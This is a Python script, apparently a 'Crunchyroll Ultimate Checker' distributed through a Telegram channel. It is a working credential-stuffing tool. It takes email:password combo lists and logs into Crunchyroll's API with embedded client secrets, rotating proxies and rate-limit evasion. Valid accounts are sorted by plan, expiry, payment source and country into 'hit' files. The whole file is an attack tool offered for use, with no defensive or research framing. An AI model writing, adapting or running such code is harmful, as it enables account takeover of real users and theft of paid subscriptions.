#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║               SHADOW REALM - CRUNCHYROLL ULTIMATE CHECKER                      ║
║                                                                              ║
║  Features:                                                                   ║
║    • Multi-threaded checking (Optimized for Mobile/PC)                       ║
║    • Full capture (Status, Plan, Expiry, Days, Country, Payment)             ║
║    • Proxy support with auto-rotation                                        ║
║    • Smart retry on rate limits (403/404)                                    ║
║    • Auto-categorization (Premium/Free/Expired/Failed)                       ║
║    • Beautiful terminal UI with dynamic progress bar                         ║
║                                                                              ║
║  Credits:                                                                    ║
║    • Developed by: Shadow Realm Channels                                        ║
║    • Telegram: @Shadow RealmChannels                                            ║
║                                                                              ║
║  Version: 3.0 Private Edition                                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import uuid
import queue
import threading
import random
from datetime import datetime, timezone
from urllib.parse import quote

# Try to import required modules
try:
    import requests
except ImportError:
    print("\n[!] Installing required packages...")
    os.system(f"{sys.executable} -m pip install requests --quiet")
    import requests

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("\n[!] Installing colorama...")
    os.system(f"{sys.executable} -m pip install colorama --quiet")
    from colorama import Fore, Style, init
    init(autoreset=True)

# Disable SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass


# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

CONFIG = {
    "threads": 15,              # Number of concurrent threads
    "delay": 2500,              # Milliseconds between accounts
    "timeout": 120,             # Seconds per account before timeout
    "retry_count": 5,           # Max retries on 403/404
    "retry_delay": 40000,       # Milliseconds between retries
}

ENDPOINTS = {
    "auth": "https://beta-api.crunchyroll.com/auth/v1/token",
    "account": "https://beta-api.crunchyroll.com/accounts/v1/me",
    "benefits": "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
    "subscription": "https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}",
}

CREDENTIALS = {
    "client_id": "ajcylfwdtjjtq7qpgks3",
    "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
}

PLAN_NAMES = {
    "fan_pack": "Mega Fan",
    "super_fan_pack": "Ultimate Fan",
    "premium": "Fan",
    "fan": "Fan",
    "mega_fan": "Mega Fan",
    "ultimate_fan": "Ultimate Fan",
}

USER_AGENTS = [
    "Crunchyroll/deviceType: Android; appVersion: 4.10.0; osVersion: 12",
    "Crunchyroll/deviceType: Android; appVersion: 4.11.0; osVersion: 13",
    "Crunchyroll/deviceType: Android; appVersion: 4.9.0; osVersion: 11",
]


# ═══════════════════════════════════════════════════════════════════════════════
# STATISTICS
# ═══════════════════════════════════════════════════════════════════════════════

stats = {
    'checked': 0,
    'premium': 0,
    'free': 0,
    'expired': 0,
    'failed': 0,
}

stats_lock = threading.Lock()
print_lock = threading.Lock()


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════════

class HttpClient:
    def __init__(self, proxy=None, worker_id=0):
        self.session = requests.Session()
        self.worker_id = worker_id
        self.device_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        
        # Setup proxy
        proxy_url = self._parse_proxy(proxy, worker_id)
        if proxy_url:
            self.session.proxies = {"http": proxy_url, "https": proxy_url}
        
        self.session.verify = False
        
        # User agent
        ua_idx = worker_id % len(USER_AGENTS)
        self.user_agent = USER_AGENTS[ua_idx]
        
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
        })
    
    def _parse_proxy(self, proxy_string, worker_id):
        if not proxy_string or not proxy_string.strip():
            return None
        proxy_string = proxy_string.strip()
        if "@" not in proxy_string and proxy_string.count(":") >= 1:
            parts = proxy_string.split(":", 1)
            user, pass_ = parts[0], parts[1]
            user = user.rstrip(";") + f";sessid.{worker_id}"
            return f"http://{quote(user)}:{quote(pass_)}@gw.dataimpulse.com:823"
        if proxy_string.startswith("http"):
            return proxy_string
        parts = proxy_string.split(":")
        if len(parts) >= 4:
            return f"http://{quote(parts[2])}:{quote(parts[3])}@{parts[0]}:{parts[1]}"
        return None
    
    def _request(self, url, method="GET", data=None, json_data=None, headers=None):
        h = dict(self.session.headers)
        if headers:
            h.update(headers)
        
        for attempt in range(3):
            try:
                if method == "GET":
                    r = self.session.get(url, headers=h, timeout=30)
                else:
                    if json_data:
                        r = self.session.post(url, headers=h, json=json_data, timeout=30)
                    else:
                        r = self.session.post(url, headers=h, data=data, timeout=30)
                
                return {
                    "status": r.status_code,
                    "body": r.text,
                    "ok": r.ok,
                }
            except Exception:
                if attempt == 2: raise
                time.sleep(2)
    
    def get(self, url, headers=None):
        return self._request(url, "GET", headers=headers)
    
    def post(self, url, data=None, json_data=None, headers=None):
        return self._request(url, "POST", data=data, json_data=json_data, headers=headers)
    
    def close(self):
        self.session.close()


# ═══════════════════════════════════════════════════════════════════════════════
# PARSER ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Parser:
    @staticmethod
    def parse_login(response_text):
        try:
            data = json.loads(response_text)
            if "error" in data: return {"success": False, "error": "Invalid credentials"}
            if "access_token" in data:
                return {"success": True, "access_token": data.get("access_token"), "account_id": data.get("account_id")}
            return {"success": False, "error": "No token"}
        except: return {"success": False, "error": "Parse error"}
    
    @staticmethod
    def parse_account(response_text):
        try:
            data = json.loads(response_text)
            return {"external_id": data.get("external_id", ""), "email": data.get("email", ""), "email_verified": data.get("email_verified", False)}
        except: return {}
    
    @staticmethod
    def parse_benefits(response_text):
        try:
            data = json.loads(response_text)
            items = data.get("items", [])
            country = ""
            for item in items:
                if "subscription_country" in item:
                    country = item["subscription_country"]
                    break
            return {"is_premium": data.get("total", 0) > 0, "country": country}
        except: return {"is_premium": False, "country": ""}
    
    @staticmethod
    def parse_subscription(response_text):
        try:
            if "not_found" in response_text.lower():
                return {"has_subscription": False, "status": "FREE"}
            
            data = json.loads(response_text)
            tier = data.get("tier", "").strip()
            plan = PLAN_NAMES.get(tier.lower(), tier.title())
            
            expiry = data.get("expiration_date", "") or data.get("next_renewal_date", "")
            expiry_clean = expiry.split("T")[0] if expiry else "N/A"
            
            days = 0
            is_expired = False
            if expiry_clean != "N/A":
                try:
                    exp_dt = datetime.strptime(expiry_clean, "%Y-%m-%d").replace(tzinfo=timezone.utc)
                    now_dt = datetime.now(timezone.utc)
                    delta = exp_dt - now_dt
                    days = max(0, delta.days)
                    is_expired = days == 0
                except: pass
            
            return {
                "has_subscription": True,
                "status": "EXPIRED" if is_expired else "PREMIUM",
                "plan_name": plan,
                "expiry_date": expiry_clean,
                "remaining_days": days,
                "auto_renew": data.get("auto_renew", False),
                "free_trial": data.get("active_free_trial", False),
                "payment": data.get("source", ""),
                "is_expired": is_expired,
            }
        except: return {"has_subscription": False, "status": "FREE"}
    
    @staticmethod
    def format_capture(email, password, account, benefits, subscription):
        parts = [f"{email}:{password}"]
        status = subscription.get("status", "FREE")
        parts.append(f"Status: {status}")
        
        if status in ["PREMIUM", "EXPIRED"]:
            parts.append(f"Plan: {subscription.get('plan_name', 'Unknown')}")
            expiry = subscription.get("expiry_date", "N/A")
            if expiry != "N/A":
                parts.append(f"Expiry: {expiry}")
                parts.append(f"Days: {subscription.get('remaining_days', 0)}")
            parts.append(f"AutoRenew: {subscription.get('auto_renew', False)}")
            if subscription.get("free_trial"): parts.append("FreeTrial: Yes")
            payment = subscription.get("payment", "")
            if payment: parts.append(f"Payment: {payment}")
        
        country = benefits.get("country", "")
        if country: parts.append(f"Country: {country}")
        if account.get("email_verified"): parts.append("Verified: Yes")
        
        return " | ".join(parts)


# ═══════════════════════════════════════════════════════════════════════════════
# WORKER
# ═══════════════════════════════════════════════════════════════════════════════

class Worker:
    def __init__(self, worker_id, proxy=None):
        self.worker_id = worker_id
        self.http = HttpClient(proxy, worker_id)
    
    def check_account(self, email, password):
        time.sleep(CONFIG["delay"] / 1000.0)
        
        auth_data = {
            "grant_type": "password", "username": email, "password": password, "scope": "offline_access",
            "client_id": CREDENTIALS["client_id"], "client_secret": CREDENTIALS["client_secret"],
            "device_type": "Python", "device_id": self.http.device_id, "device_name": "Checker"
        }
        form_data = "&".join([f"{k}={v}" for k, v in auth_data.items()])
        headers = {"Content-Type": "application/x-www-form-urlencoded", "etp-anonymous-id": self.http.session_id}
        
        auth_resp = self.http.post(ENDPOINTS["auth"], data=form_data, headers=headers)
        
        if auth_resp["status"] in [403, 404]: raise Exception(str(auth_resp["status"]))
        if not auth_resp["ok"]: raise Exception(f"HTTP {auth_resp['status']}")
        
        login = Parser.parse_login(auth_resp["body"])
        if not login.get("success"): raise Exception("Invalid")
        
        token, account_id = login["access_token"], login["account_id"]
        auth_headers = {"Authorization": f"Bearer {token}", "etp-anonymous-id": self.http.session_id}
        
        account_resp = self.http.get(ENDPOINTS["account"], headers=auth_headers)
        account = Parser.parse_account(account_resp["body"])
        external_id = account.get("external_id", "")
        
        if not external_id: raise Exception("No external ID")
        
        benefits_url = ENDPOINTS["benefits"].format(external_id=external_id)
        benefits_resp = self.http.get(benefits_url, headers=auth_headers)
        benefits = Parser.parse_benefits(benefits_resp["body"])
        
        sub_url = ENDPOINTS["subscription"].format(account_id=account_id)
        sub_resp = self.http.get(sub_url, headers=auth_headers)
        subscription = Parser.parse_subscription(sub_resp["body"])
        
        return {"account": account, "benefits": benefits, "subscription": subscription}
    
    def run_account(self, email, password):
        max_retries = CONFIG["retry_count"]
        retry_delay = CONFIG["retry_delay"]
        timeout = CONFIG["timeout"]
        
        for attempt in range(max_retries + 1):
            holder = []
            def run():
                try: holder.append(("ok", self.check_account(email, password)))
                except Exception as e: holder.append(("err", str(e)))
            
            thread = threading.Thread(target=run, daemon=True)
            thread.start()
            thread.join(timeout=timeout)
            
            if not holder:
                if attempt < max_retries:
                    time.sleep((retry_delay * 0.5) / 1000.0)
                    continue
                return {"status": "failed", "error": "Timeout"}
            
            status, value = holder[0]
            if status == "ok": return {"status": "success", "data": value}
            
            error = value
            if attempt < max_retries and error in ["403", "404"]:
                jitter = 0.9 + 0.2 * random.random()
                time.sleep((retry_delay * (attempt + 1) * jitter) / 1000.0)
            else:
                return {"status": "failed", "error": error}
        
        return {"status": "failed", "error": "Max retries"}
    
    def close(self):
        self.http.close()


# ═══════════════════════════════════════════════════════════════════════════════
# FILE OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def save_result(filename, content):
    with print_lock:
        os.makedirs(os.path.dirname(filename) if os.path.dirname(filename) else ".", exist_ok=True)
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + "\n")


# ═══════════════════════════════════════════════════════════════════════════════
# UI FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║   {Fore.MAGENTA}███╗   ██╗ {Fore.BLUE}██████╗ {Fore.CYAN}██╗   ██╗ {Fore.WHITE}█████╗ {Fore.CYAN}   ║
{Fore.CYAN}║   {Fore.MAGENTA}████╗  ██║ {Fore.BLUE}██╔═══██╗{Fore.CYAN}██║   ██║ {Fore.WHITE}██╔══██╗{Fore.CYAN}   ║
{Fore.CYAN}║   {Fore.MAGENTA}██╔██╗ ██║ {Fore.BLUE}██║   ██║{Fore.CYAN}██║   ██║ {Fore.WHITE}███████║{Fore.CYAN}   ║
{Fore.CYAN}║   {Fore.MAGENTA}██║╚██╗██║ {Fore.BLUE}██║   ██║{Fore.CYAN}╚██╗ ██╔╝ {Fore.WHITE}██╔══██║{Fore.CYAN}   ║
{Fore.CYAN}║   {Fore.MAGENTA}██║ ╚████║ {Fore.BLUE}╚██████╔╝{Fore.CYAN} ╚████╔╝  {Fore.WHITE}██║  ██║{Fore.CYAN}   ║
{Fore.CYAN}║   {Fore.MAGENTA}╚═╝  ╚═══╝ {Fore.BLUE} ╚═════╝ {Fore.CYAN}  ╚═══╝   {Fore.WHITE}╚═╝  ╚═╝{Fore.CYAN}   ║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║          {Fore.WHITE}Ultimate Checker - Full Capture Edition               {Fore.CYAN}║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║          {Fore.GREEN}Developed by: Shadow Realm Channels                     {Fore.CYAN}║
{Fore.CYAN}║          {Fore.YELLOW}Version: 3.0 Private Edition                         {Fore.CYAN}║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def update_progress(total):
    with stats_lock:
        percent = min((stats['checked'] / total * 100), 100) if total > 0 else 0
        bar_len = 45
        filled = int(bar_len * percent / 100)
        bar = '█' * filled + '░' * (bar_len - filled)
        
        # \r to overwrite the line, creating a smooth loading bar
        sys.stdout.write(f"\r{Fore.MAGENTA}[{bar}] {Fore.WHITE}{percent:.1f}% {Fore.CYAN}| "
              f"{Fore.GREEN}Prem: {stats['premium']} {Fore.CYAN}| "
              f"{Fore.YELLOW}Free: {stats['free']} {Fore.CYAN}| "
              f"{Fore.RED}Fail: {stats['failed']}  ")
        sys.stdout.flush()


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN THREAD
# ═══════════════════════════════════════════════════════════════════════════════

def worker_thread(worker_id, account_queue, proxies):
    proxy = proxies[worker_id % len(proxies)] if proxies else None
    worker = Worker(worker_id, proxy)
    
    while True:
        try:
            account = account_queue.get(timeout=1)
            if account is None: break
            
            email, password = account["email"], account["password"]
            result = worker.run_account(email, password)
            
            with stats_lock:
                stats['checked'] += 1
            
            if result["status"] == "success":
                data = result["data"]
                capture = Parser.format_capture(email, password, data["account"], data["benefits"], data["subscription"])
                status = data["subscription"].get("status", "FREE")
                
                save_result("SR_Results/crunchy_all_hits.txt", capture)
                
                if status == "PREMIUM":
                    with stats_lock: stats['premium'] += 1
                    save_result("SR_Results/crunchy_premium.txt", capture)
                    plan = data["subscription"].get("plan_name", "")
                    days = data["subscription"].get("remaining_days", 0)
                    with print_lock:
                        # Clear line before printing hit to not mess up progress bar
                        sys.stdout.write('\x1b[2K\r')
                        print(f"{Fore.GREEN}💎 [HIT] {email} | {plan} | {days} Days")
                
                elif status == "EXPIRED":
                    with stats_lock: stats['expired'] += 1
                    save_result("SR_Results/crunchy_expired.txt", capture)
                
                elif status == "FREE":
                    with stats_lock: stats['free'] += 1
                    save_result("SR_Results/crunchy_free.txt", capture)
            
            else:
                with stats_lock: stats['failed'] += 1
                error = result.get("error", "Unknown")
                save_result("SR_Results/crunchy_failed.txt", f"{email}:{password} | {error}")
        
        except queue.Empty: break
        except Exception: pass
    
    worker.close()


# ═══════════════════════════════════════════════════════════════════════════════
# INITIALIZATION
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print_banner()
    
    print(f"{Fore.CYAN}[1] {Fore.WHITE}Load from file (.txt)")
    print(f"{Fore.CYAN}[2] {Fore.WHITE}Single account check")
    
    try: choice = input(f"\n{Fore.GREEN}➜ Choose option: {Fore.WHITE}").strip()
    except: sys.exit(0)
    
    accounts = []
    
    if choice == "1":
        try:
            filename = input(f"{Fore.YELLOW}➜ Combo file path: {Fore.WHITE}").strip().replace('"', '')
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        accounts.append({"email": parts[0].strip(), "password": parts[1].strip()})
            if not accounts:
                print(f"{Fore.RED}✗ No accounts found!")
                sys.exit(1)
            print(f"{Fore.GREEN}✓ Loaded {len(accounts)} accounts.")
        except FileNotFoundError:
            print(f"{Fore.RED}✗ File not found!")
            sys.exit(1)
    elif choice == "2":
        email = input(f"{Fore.YELLOW}Email: {Fore.WHITE}").strip()
        password = input(f"{Fore.YELLOW}Password: {Fore.WHITE}").strip()
        accounts.append({"email": email, "password": password})
    else:
        sys.exit(1)
    
    proxies = []
    use_proxy = input(f"\n{Fore.YELLOW}➜ Use proxies? (y/n): {Fore.WHITE}").strip().lower()
    
    if use_proxy == 'y':
        proxy_input = input(f"{Fore.YELLOW}➜ Proxy file path: {Fore.WHITE}").strip().replace('"', '')
        if os.path.exists(proxy_input):
            with open(proxy_input, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line: proxies.append(line)
            print(f"{Fore.GREEN}✓ Loaded {len(proxies)} proxies.")
        else:
            proxies.append(proxy_input)
            print(f"{Fore.GREEN}✓ Using single proxy.")
    
    if not proxies: proxies = [None]
    
    default_threads = min(CONFIG["threads"], len(accounts))
    try:
        threads_input = input(f"\n{Fore.YELLOW}➜ Threads (Default {default_threads}): {Fore.WHITE}").strip()
        threads = int(threads_input) if threads_input.isdigit() else default_threads
    except: threads = default_threads
    
    threads = min(threads, len(accounts))
    
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║  {Fore.WHITE}Shadow Realm Engine Started...                                     {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝\n")
    
    os.makedirs("SR_Results", exist_ok=True)
    
    account_queue = queue.Queue()
    for acc in accounts: account_queue.put(acc)
    for _ in range(threads): account_queue.put(None)
    
    start_time = time.time()
    workers = []
    
    for i in range(threads):
        t = threading.Thread(target=worker_thread, args=(i, account_queue, proxies))
        t.start()
        workers.append(t)
        time.sleep(0.05)
    
    # Progress Loop
    while any(t.is_alive() for t in workers):
        update_progress(len(accounts))
        time.sleep(0.5)
    
    # Final progress update to reach 100%
    update_progress(len(accounts))
    print() # New line after progress bar finishes
    
    for t in workers: t.join()
    
    elapsed = time.time() - start_time
    
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║                        {Fore.WHITE}MISSION COMPLETED                         {Fore.CYAN}║")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║  {Fore.GREEN}💎 Premium: {stats['premium']:<15}{Fore.CYAN}                                    ║")
    print(f"{Fore.CYAN}║  {Fore.YELLOW}📺 Free: {stats['free']:<15}{Fore.CYAN}                                       ║")
    print(f"{Fore.CYAN}║  {Fore.MAGENTA}⏳ Expired: {stats['expired']:<15}{Fore.CYAN}                                    ║")
    print(f"{Fore.CYAN}║  {Fore.RED}❌ Failed: {stats['failed']:<15}{Fore.CYAN}                                     ║")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║  {Fore.WHITE}Time: {elapsed:.2f}s | Speed: {len(accounts)/elapsed:.2f} acc/s{Fore.CYAN}            ║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝\n")
    
    print(f"{Fore.GREEN}➜ Results saved in 'SR_Results' folder.")
    print(f"{Fore.YELLOW}➜ Telegram: @Shadow RealmChannels{Fore.WHITE}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠ Process Cancelled by User.{Fore.WHITE}\n")
    except Exception as e:
        print(f"\n{Fore.RED}✗ Error: {e}{Fore.WHITE}\n")